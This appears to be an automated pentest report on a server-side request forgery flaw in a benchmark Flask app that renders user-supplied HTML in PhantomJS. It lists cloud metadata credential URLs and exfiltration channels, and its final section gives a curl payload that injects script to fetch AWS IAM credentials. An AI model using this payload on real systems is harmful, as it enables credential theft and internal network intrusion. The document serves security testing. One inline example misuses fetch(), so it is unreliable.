# SSRF Analysis Report

## 1. Executive Summary
- **Analysis Status:** Complete
- **Key Outcome:** One high-confidence SSRF vulnerability was identified through PhantomJS HTML injection, allowing server-side request forgery via client-side redirects executed in the headless browser context.
- **Purpose of this Document:** This report provides the strategic context on the application's outbound request mechanisms, dominant flaw patterns, and key architectural details necessary to effectively exploit the vulnerability listed in the exploitation queue.

## 2. Dominant Vulnerability Patterns

### Pattern 1: Server-Side Request Forgery via HTML Injection in Headless Browser
- **Description:** The application writes user-controllable HTML content to a temporary file that is subsequently rendered by PhantomJS (a headless browser) running on the server. While the initial URL loaded by PhantomJS is hardcoded to localhost, the HTML content can contain JavaScript, meta refresh tags, iframes, or fetch() calls that force PhantomJS to make arbitrary HTTP requests from the server's network context.
- **Implication:** Attackers can force the server to make requests to internal services (AWS metadata endpoints, internal APIs, databases), perform port scanning of the internal network, or exfiltrate data through out-of-band channels. PhantomJS executes with the server's network privileges, bypassing firewall restrictions that would normally block direct external access to internal resources.
- **Representative Findings:** `SSRF-VULN-01`
- **Attack Vector Classification:** Second-order SSRF - the URL parameter is not directly user-controlled, but the content at that URL is user-controlled and can trigger additional requests.

## 3. Strategic Intelligence for Exploitation

### HTTP Client Library
The application uses **PhantomJS 1.4.1** (deprecated since March 2018) as a headless browser for server-side HTML rendering and XSS validation. PhantomJS is invoked via Python's `subprocess.Popen()` mechanism.

**PhantomJS Configuration:**
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-064-24/src/app.py` (Line 34)
- **Command:** `subprocess.Popen(["timeout","5","phantomjs", "check.js"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)`
- **Timeout:** 5 seconds (hard limit via `timeout` command)
- **Script:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-064-24/src/check.js` controls PhantomJS behavior
- **Network Context:** PhantomJS inherits the Flask application's network context, running inside the same Docker container with access to:
  - localhost services (Flask app on port 5000)
  - Internal Docker network
  - Any services accessible from the container's network namespace
  - Potentially AWS EC2 metadata endpoint (169.254.169.254) if running on AWS

### Request Architecture

**Data Flow from User Input to Server-Side Request:**

1. **User Input Entry** (POST /page):
   - Parameter: `solution` (form-encoded POST parameter)
   - Location: `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-064-24/src/app.py` line 66
   - Code: `msg = request.form.get('solution','')`
   - Validation: NONE

2. **HTML Template Injection**:
   - Location: Line 67
   - Code: `value = "" if msg == "" else 'value="{0}"'.format(msg)`
   - User input directly formatted into HTML attribute without sanitization

3. **Complete HTML Document Generation**:
   - Location: Line 69
   - Code: `data = CONTENT_POST.format("9", "Circle", value, "", "")`
   - Result: Full HTML page with user-controlled content embedded

4. **Temporary File Creation**:
   - Location: Lines 35-40
   - Filename: `"static/" + os.urandom(16).encode('hex') + '.html'` (cryptographically random, 128-bit entropy)
   - Write: `open(fn, 'w').write(page)` - Unsanitized HTML written to web-accessible directory
   - URL: `'http://localhost:5000/' + fn` (hardcoded localhost URL)

5. **PhantomJS Invocation**:
   - Location: Lines 34, 43
   - PhantomJS subprocess receives hardcoded localhost URL via stdin
   - PhantomJS navigates to the temporary HTML file and renders all content
   - JavaScript execution enabled, all browser APIs available (fetch, XMLHttpRequest, window.location, etc.)

6. **Request Execution Context**:
   - PhantomJS executes HTML/JavaScript with full browser capabilities
   - Client-side redirects (meta refresh, window.location, iframe src, fetch) trigger server-side requests
   - Requests originate from server's IP address and network context
   - No Same-Origin Policy restrictions for local files
   - No Content Security Policy configured

7. **Response Handling**:
   - Location: Lines 45-48
   - PhantomJS script captures `alert()`, `confirm()`, `prompt()` dialog outputs
   - Only first line of stdout returned: `result = proc.stdout.readline().strip()`
   - Limited exfiltration via dialog functions, but blind SSRF still exploitable

**Key Architectural Weakness:** The application treats user-supplied HTML as trusted content once written to disk, allowing PhantomJS to execute arbitrary JavaScript that can initiate outbound HTTP requests. The 5-second timeout provides some DoS protection but does not prevent SSRF exploitation.

### Internal Services

**Discovered Internal Service Access:**

Based on the Docker container architecture and network context:

1. **Flask Application (localhost:5000)**:
   - PhantomJS can access the Flask app's own endpoints
   - Potential for self-XSS or recursive request attacks

2. **Docker Internal Network**:
   - Container has access to Docker bridge network
   - Can potentially reach other containers in the same Docker network
   - Internal service discovery possible via port scanning

3. **Cloud Metadata Endpoints (if on AWS/GCP/Azure)**:
   - AWS: `http://169.254.169.254/latest/meta-data/`
   - AWS credentials: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
   - Google Cloud: `http://metadata.google.internal/computeMetadata/v1/`
   - Azure: `http://169.254.169.254/metadata/instance`

4. **Localhost Services**:
   - Any service bound to 127.0.0.1 within the container
   - Potentially unrestricted access to local-only services

**Network Restriction Assessment:**
- ❌ No IP address allowlisting/blocklisting
- ❌ No URL scheme restrictions beyond what PhantomJS naturally supports
- ❌ No hostname validation
- ❌ No port restrictions
- ❌ No private IP range blocking (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16)
- ✅ 5-second timeout provides minimal DoS protection only

### Timeout and Response Handling

**Timeout Mechanism:**
- Hard limit: 5 seconds via `timeout 5 phantomjs` command (line 34)
- Purpose: Prevents infinite PhantomJS execution
- Impact on SSRF: Short window for requests, but sufficient for:
  - Single metadata endpoint queries
  - Port scanning (with limited concurrent requests)
  - Quick internal API calls
  - DNS exfiltration

**Response Exfiltration Channels:**

1. **Dialog Capture (Partial Exfiltration)**:
   - PhantomJS monitors `alert()`, `confirm()`, `prompt()` functions
   - First line of dialog output returned to attacker
   - Example: `alert(fetch('http://169.254.169.254/...').text)` → First line visible in response

2. **Blind SSRF (No Direct Response)**:
   - Attacker cannot see full response bodies from internal services
   - Still exploitable for:
     - Port scanning (timing differences, error messages)
     - Triggering state changes in internal APIs (POST requests)
     - DNS exfiltration to attacker-controlled domain
     - Out-of-band HTTP callbacks to attacker server

3. **Timing Side Channels**:
   - Response time differences indicate successful connections vs. timeouts
   - Can enumerate open ports and live services

## 4. Secure by Design: Validated Components

These components were analyzed and found to have robust defenses or no exploitable SSRF attack surface. They are low-priority for further testing.

| Component/Flow | Endpoint/File Location | Defense Mechanism Implemented | Verdict |
|---|---|---|---|
| urllib Module | `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-064-24/src/app.py` line 9 | Module imported but never invoked anywhere in codebase. Dead code with zero attack surface. | SAFE |
| Flask redirect/Response Functions | `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-064-24/src/app.py` line 3 | Functions imported (`Response`, `make_response`, `url_for`) but never used. No redirect functionality exists. | SAFE |
| CONTENT_IFRAME Template | `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-064-24/src/constants.py` lines 126-149 | Template definition exists with iframe and URL input, but no route renders this template. Dead code, zero network accessibility. | SAFE |
| Static File Serving | Flask default handler `/static/<path>` | Uses Flask's built-in `send_from_directory()` with path traversal protections. Filenames are cryptographically random (`os.urandom(16)`), not user-controlled. | SAFE |
| PhantomJS URL Parameter | `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-064-24/src/app.py` line 36 | URL passed to PhantomJS is hardcoded: `'http://localhost:5000/' + fn` where `fn` is server-generated random filename. No user control over URL destination. | SAFE |

**Note on "Safe" Classification:** These components are safe from traditional SSRF where users directly control URL parameters. However, the PhantomJS HTML content injection (SSRF-VULN-01) circumvents the URL parameter protection by allowing client-side redirects within the rendered HTML.

## 5. Analysis Methodology Summary

The SSRF analysis followed the backward taint analysis methodology:

1. **Sink Identification**: Identified PhantomJS `page.open()` as the primary server-side request sink
2. **Backward Trace**: Traced data flow from `page.open()` backward through:
   - URL construction (hardcoded localhost)
   - File write operation (user-controlled content)
   - HTML template generation (unsanitized user input)
   - User input parameter (`solution`)
3. **Sanitization Check**: Verified that NO URL validation, protocol restrictions, IP filtering, or hostname allowlisting exists
4. **Mutation Check**: Identified that HTML content mutations (JavaScript redirects) occur AFTER the initial hardcoded URL is loaded
5. **Exploitability Verdict**: Confirmed exploitable via second-order SSRF through HTML injection

All potential SSRF sinks from the reconnaissance deliverable were systematically analyzed:
- ✅ PhantomJS page.open() - **VULNERABLE**
- ✅ urllib module - **SAFE** (unused)
- ✅ Flask redirect functions - **SAFE** (unused)
- ✅ CONTENT_IFRAME template - **SAFE** (unreachable)

## 6. Key Defensive Gaps

The following SSRF defenses are **completely absent** from the application:

1. **URL Allowlisting**: No restriction on which domains/IPs PhantomJS can access
2. **Protocol Restrictions**: No limitation to https:// only (file://, data://, etc. may work)
3. **IP Address Blocking**: No blocking of private IP ranges (RFC 1918, link-local, localhost)
4. **Cloud Metadata Blocking**: No specific blocks for 169.254.169.254 or metadata.google.internal
5. **Port Allowlisting**: No restriction to ports 80/443 only
6. **DNS Resolution Validation**: No checks for DNS rebinding or TOCTOU attacks
7. **Content Security Policy**: No CSP headers to restrict JavaScript execution in PhantomJS context
8. **HTML Sanitization**: User input not sanitized before being written to HTML file
9. **JavaScript Execution Controls**: PhantomJS runs with full JavaScript capabilities enabled
10. **Network Egress Filtering**: No firewall rules or iptables restrictions on outbound connections from container

## 7. External Exploitability Assessment

**Question:** Can this vulnerability be exploited from the public internet via http://localhost:38177 without internal network access?

**Answer:** **YES - Externally Exploitable**

**Reasoning:**
1. **Public Endpoint**: The `/page` endpoint is publicly accessible without authentication
2. **No Network Prerequisites**: Attacker only needs HTTP access to port 38177 (publicly exposed)
3. **Server-Side Execution**: PhantomJS runs server-side, not client-side, so attacker's network location is irrelevant
4. **Network Context Leverage**: The vulnerability allows leveraging the **server's** network context, not the attacker's
5. **Direct Attack Path**: 
   - Attacker → `POST http://localhost:38177/page` → Flask app writes HTML → PhantomJS executes → SSRF from server

**Attack Scenario from External Network:**
```bash
# Attacker from internet (no VPN, no internal access)
curl -X POST http://localhost:38177/page \
  -d 'solution=<script>fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/").then(r=>r.text()).then(d=>alert(d))</script>'

# Result: Flask server's PhantomJS instance makes request to AWS metadata endpoint
# Server has internal network access, attacker leverages it as a proxy
```

**Why This is Externally Exploitable:**
- The vulnerability is in the **application layer**, not network layer
- No internal network access required - attack vector is an HTTP POST request
- The server acts as an unwitting proxy to internal resources
- This is the defining characteristic of SSRF: using a public endpoint to access internal resources

**Contrast with NOT Externally Exploitable:**
- If the vulnerability required being on the internal Docker network → NOT externally exploitable
- If it required VPN access to the corporate network → NOT externally exploitable  
- If it required direct container shell access → NOT externally exploitable

**This vulnerability allows external attackers to:**
- Access internal services they couldn't otherwise reach
- Retrieve cloud metadata from internet without AWS access
- Port scan internal networks from outside the network perimeter
- Bypass firewall rules that block inbound but allow outbound

**Conclusion:** This SSRF vulnerability is **fully exploitable from the external attack surface** (http://localhost:38177) and will be included in the exploitation queue with `externally_exploitable: true`.

---

**Analysis completed:** 2025-10-30  
**Confidence level:** High  
**Total SSRF vulnerabilities identified:** 1 (externally exploitable)  
**Total components analyzed:** 4  
**Secure components identified:** 3